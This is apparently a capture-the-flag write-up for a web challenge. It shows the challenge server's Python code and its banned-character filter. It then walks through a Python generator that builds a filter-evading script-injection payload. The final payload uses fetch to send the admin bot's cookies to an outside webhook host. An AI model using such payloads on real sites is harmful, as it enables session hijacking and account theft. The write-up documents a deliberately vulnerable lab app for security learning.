# 🏷️ KISSFIXESS REVENGE

**Category:** Web  
**Description:**  
> Okay, NOW ain't nobody gonna solve it.

For the revenge challenge there is not much changed but filtering got harder to bypass let's dig deeper.


This is the new app.py


```py
lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)

banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "&", "%", "^", "#", "@", "!", "*", "-", "import", "eval", "exec", "os", ";", ",", "|", "JAVASCRIPT", "window", "atob", "btoa", "="]


def escape_html(text):
    """Escapes HTML special characters in the given text."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("(", "&#40;").replace(")", "&#41;")

def render_page(name_to_display=None):
    """Renders the HTML page with the given name."""
    templ = html_template.replace("NAME", name_to_display or "")
    template = Template(templ, lookup=lookup)
    tp = template.render(name_to_display=name_to_display, banned="&<>()", copyright="haha", help="haha", quit="haha")
    try:
        tp_data = tp.split("<div class=\"rainbow-text\">")[1].split("</div>")[0]
        if "." in tp_data or "href" in tp_data.lower():
            name = "Banned characters detected!"
            return name
    except IndexError:
        name = "Something went wrong!"
        return name

    return tp

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        # Parse the path and extract query parameters
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        name = params.get("name_input", [""])[0]
        
        for b in banned:
            if b in name:
                name = "Banned characters detected!"
                print(b)

        # Render and return the page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(render_page(name_to_display=name).encode("utf-8"))
    
    def do_POST(self):
        # Handle POST requests to report names
        if self.path == "/report":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            name = json.loads(post_data.decode('utf-8')).get("name", "")
            print(f"Received name: {name}")
            if name:
                print(f"Reported name: {name}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Name reported successfully!")
                Thread(target=visit_url, args=(name,)).start()
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request: No name provided.")
        else:
            self.send_response(404)
            self.end_headers()

def run_server(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    server_address = ("0.0.0.0", port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting http server on port {port}...")
    print(f"Access the page at http://0.0.0.0:{port}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        httpd.server_close()

if __name__ == "__main__":
    run_server()
```

As we can see now can't use the html encoding since # is blocked.
What we can do is injecting script tag then use String.fromCharCode to decode that banned characters.

<br />


```py
def create_map(banned):
    return {
        "<": f"${{banned[1]}}",  
        ">": f"${{banned[2]}}",  
        "(": f"${{banned[3]}}",  
        ")": f"${{banned[4]}}",  
        "s": f"'+String['fromCharCode']${{banned[3]}}115${{banned[4]}}+'", 
        "l": f"'+String['fromCharCode']${{banned[3]}}108${{banned[4]}}+'",
        ".": f"'+String['fromCharCode']${{banned[3]}}46${{banned[4]}}+'",  
        "=": f"'+String['fromCharCode']${{banned[3]}}61${{banned[4]}}+'"  
    }

def encode_payload(payload, banned):
    mappings = create_map(banned)
    final_payload = ""
    for i in payload:
        final_payload += mappings.get(i, i)
    return final_payload

def wrap_payload(encoded_payload, banned):
    return f"${{banned[1]}}Script${{banned[2]}}{encoded_payload}${{banned[1]}}/Script${{banned[2]}}"

def generate_payload(payload, banned):
    encoded = encode_payload(payload, banned)
    return wrap_payload(encoded, banned)

banned = ["<", ">", "s", "l", "(", ")", "self", "_", ".", "\"", "\\", "&", "%", "^", "#", "@", "!", "*", "-", "import", "eval", "exec", "os", ";", ",", "|", "JAVASCRIPT", "window", "atob", "btoa", "="]

payload = "fetch('http://webhook/?q='+document['cookie'])"

final_payload = generate_payload(payload, banned)
print(final_payload)

```

<br />

Final payload:

```
${banned[1]}Script${banned[2]}fetch${banned[3]}'http'+String['fromCharCode']${banned[3]}115${banned[4]}+'://eogce8tgujfgk5f'+String['fromCharCode']${banned[3]}46${banned[4]}+'m'+String['fromCharCode']${banned[3]}46${banned[4]}+'pipedream'+String['fromCharCode']${banned[3]}46${banned[4]}+'net/?q'+String['fromCharCode']${banned[3]}61${banned[4]}+''+document['cookie']${banned[4]}${banned[1]}/Script${banned[2]}
```

reporting to admin

<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/10.png'>

<br />

<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/11.png'>

<br />


<img src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/ez-yann.gif" alt="Skeleton GIF" width="300" height="300">
